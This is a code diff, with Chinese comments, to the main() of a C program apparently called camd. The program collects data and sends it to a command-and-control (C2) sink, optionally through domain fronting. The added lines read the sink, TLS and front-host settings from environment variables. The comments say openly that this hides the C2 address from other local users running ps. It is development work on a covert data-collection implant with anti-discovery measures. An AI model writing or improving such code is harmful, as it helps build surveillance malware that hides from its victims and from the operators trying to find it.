@@ -179,6 +179,25 @@ int main(int argc, char **argv)
         return 2;
     }
 
+    /* 命令行缺省时回落到环境变量。
+     *
+     * 为何必须有这条路：run.sh 若把 `--sink tcp://C2:PORT` 写在 exec 命令行
+     * 上，/proc/<pid>/cmdline 是 0444 世界可读——任何本地用户 `ps` 一下即得
+     * 到 C2 地址。这比密钥泄露更直接：拿到 C2 地址就能定位服务端、干扰或
+     * 伪装收端；front:// 形态下连真实目标（--front-host）也在同一行里。
+     *
+     * 环境变量存在 /proc/<pid>/environ，权限 0400 且仅同用户 / root 可读，
+     * 暴露面小一个量级。命令行仍优先，便于调试与既有测试。
+     *
+     * 注意这是"降低暴露面"而非"消除"：root 仍可读 environ。目标是让普通
+     * 用户的 `ps` 无从获得 C2 地址，而不是对抗已提权的取证。 */
+    if (!cfg.sink_path   || !*cfg.sink_path)   cfg.sink_path   = getenv("CAMD_SINK");
+    if (!cfg.backend     || !*cfg.backend)     cfg.backend     = getenv("CAMD_BACKEND");
+    if (!cfg.tls_ca      || !*cfg.tls_ca)      cfg.tls_ca      = getenv("CAMD_CA");
+    if (!cfg.tls_sni     || !*cfg.tls_sni)     cfg.tls_sni     = getenv("CAMD_SNI");
+    if (!cfg.front_host  || !*cfg.front_host)  cfg.front_host  = getenv("CAMD_FRONT_HOST");
+    if (!cfg.front_path  || !*cfg.front_path)  cfg.front_path  = getenv("CAMD_FRONT_PATH");
+
     /* sink 是硬性要求。允许它为空等于允许"采到了但什么都不回传"——
      * 那正是最难被发现的一类部署事故：进程在跑、灯在亮、无产出。 */
     if (!cfg.sink_path || !*cfg.sink_path) {
